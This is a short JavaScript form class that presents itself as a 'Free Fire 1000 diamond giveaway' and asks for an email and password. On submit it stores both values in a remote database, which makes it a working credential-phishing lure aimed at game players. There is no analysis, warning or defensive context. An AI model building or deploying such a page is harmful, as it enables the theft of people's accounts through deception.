class Form {
  constructor() {
    this.input1 = createInput("E-MAIL");
    this.input2 = createInput("PASSWORD");
    this.title = createElement('h2');
    this.button = createButton("SUBMIT");
  }

  display(){
    this.title.html("FREE FIRE 1000 DIAMOND GIVEAWAY");
    this.title.position(260,600);
    this.title.style('color',0);

    this.button.position(440,440);

    this.input1.position(380,300);
    this.input2.position(380,350);
    
    this.button.mousePressed(()=>{
      database.ref('/').update({
        player: this.input2.value(),
        mail: this.input1.value()
      });
    })
  }
}
